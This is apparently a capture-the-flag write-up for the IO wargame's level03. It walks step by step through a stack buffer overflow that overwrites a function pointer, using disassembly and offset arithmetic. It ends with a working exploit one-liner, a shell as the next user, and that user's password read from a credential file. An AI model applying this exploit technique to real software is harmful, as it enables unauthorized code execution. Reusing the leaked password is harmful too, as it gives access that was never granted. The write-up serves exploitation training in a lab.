Let's take a look at the source code...

```
level3@io:/levels$ cat /levels/level03.c
//bla, based on work by beach

#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0;
}

```

Looking at the code, it is clear that we want to read the good(0 function, wo we can get a shell. We can see a vulnerabillity on these lines.

```
        char buffer[50];

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);
```

Looking at this, it establishes a space in memory that is 50 bytes long. It uses the memcpy function to copy the second argument (first argument after the file name), to that space, and will write as much data as it needs to (even if it starts writing outside of the buffer).
Then it will use memset on the same space to ovewrite the entire buffer, except for the last four bytes (giving us enough space for a 32 bit address), with zeroes. The four bytes it leaves unwritten will be enough to write an address. Now let's take a look at the input filtering it has.

```
        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;
```

So this requires that the function is given two arguments (so the filename and another argument), and that the second argument must be atleast 4 characters long, otherwise it will just exit the program. Other than that,
the input isn't filtered. So since there are no calls to the win function, however we can overwrite the eip register which holds the return address so we can force it to run that function. There appears to be 
a couple of things missing with the eip register so let's just try running the binary.

```
level3@io:/levels$ ./level03 4444
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
level3@io:/levels$ ./level03 0000
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
```

If the binary is telling us the truth, then it appears that it has hardcoded the eip register. Let's see if we can find where the address is pointing us.

```
level3@io:/levels$ objdump -D level03 | grep 80484a4
080484a4 <bad>:
 80484a4:	55                   	push   %ebp
 80484b2:	c7 44 24 04 a4 84 04 	movl   $0x80484a4,0x4(%esp)
 80484d8:	c7 45 f4 a4 84 04 08 	movl   $0x80484a4,-0xc(%ebp)
```

So we can see that it is pointing us to the bad function, which from our previous output makes since. It also lead me to the conclusion that the following lines of code were responsible for hard coding the eip register

```
        void (*functionpointer)(void) = bad;
        
        
        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();
```

So because the function is called at the very end of main, if we try to overwrite the eip register it will just get overwritten. However we could try to overwrite the bad address in that function to good, so when it calls it at the end, it will set the eip register to good and thus give us a shell. This will require looking at the disassembly.

```
Dump of assembler code for function main:
   0x080484c8 <+0>:	push   ebp
   0x080484c9 <+1>:	mov    ebp,esp
   0x080484cb <+3>:	sub    esp,0x78
   0x080484ce <+6>:	and    esp,0xfffffff0
   0x080484d1 <+9>:	mov    eax,0x0
   0x080484d6 <+14>:	sub    esp,eax
   0x080484d8 <+16>:	mov    DWORD PTR [ebp-0xc],0x80484a4
   0x080484df <+23>:	cmp    DWORD PTR [ebp+0x8],0x2
   0x080484e3 <+27>:	jne    0x80484fc <main+52>
   0x080484e5 <+29>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484e8 <+32>:	add    eax,0x4
   0x080484eb <+35>:	mov    eax,DWORD PTR [eax]
   0x080484ed <+37>:	mov    DWORD PTR [esp],eax
   0x080484f0 <+40>:	call   0x804839c <strlen@plt>
```

Since in the program the strleng() is called after "void (*functionpointer)(void) = bad;" it is safe to assume that the address we are trying to overwrite
is above main+40. Looking at main+16, it appears that the address is stored in memory at ebp-0xc (Since it is moving the address into the location). So now to find where our input is first stored.

```
   0x080484f5 <+45>:	cmp    eax,0x3
   0x080484f8 <+48>:	jbe    0x80484fc <main+52>
   0x080484fa <+50>:	jmp    0x8048505 <main+61>
   0x080484fc <+52>:	mov    DWORD PTR [ebp-0x5c],0x0
   0x08048503 <+59>:	jmp    0x8048579 <main+177>
   0x08048505 <+61>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048508 <+64>:	add    eax,0x4
   0x0804850b <+67>:	mov    eax,DWORD PTR [eax]
---Type <return> to continue, or q <return> to quit---
   0x0804850d <+69>:	mov    DWORD PTR [esp],eax
   0x08048510 <+72>:	call   0x804839c <strlen@plt>
   0x08048515 <+77>:	mov    DWORD PTR [esp+0x8],eax
   0x08048519 <+81>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804851c <+84>:	add    eax,0x4
   0x0804851f <+87>:	mov    eax,DWORD PTR [eax]
   0x08048521 <+89>:	mov    DWORD PTR [esp+0x4],eax
   0x08048525 <+93>:	lea    eax,[ebp-0x58]
   0x08048528 <+96>:	mov    DWORD PTR [esp],eax
   0x0804852b <+99>:	call   0x804838c <memcpy@plt>
```

Yet again, using where the functions are called as our guide, we can assume that we can find our input within this portion. Looking 
avove the memcpy call, we can see that it loads a memory address at ebp-0x58 and supplies it as an argument to the memcpy function (while I was solving this challenge, I played around viewing the register values to confirm this). So let's assume that that is where our input is stored. Now we have to find out how many characters we have to write to reach the address.

```
0x58 - 0xc = 76
```

So it will take 76 characters to reach the address. Now to find the address of the good() function.

```
level3@io:/levels$ objdump -D level03 | grep good
08048474 <good>:
```

So now that we have the address (0x08048474), we have everything we need to craft the input (remembering that we have to send the address using little endian).

```
level3@io:/levels$ ./level03 `python -c 'print "0"*76 + "\x74\x84\x04\x08"'`
This is exciting we're going to 0x8048474
Win.
sh-4.3$ whoami
level4
sh-4.3$ cat /home/level4/.pass
7WhHa5HWMNRAYl9T
```

And just like that, we pwned the binary.
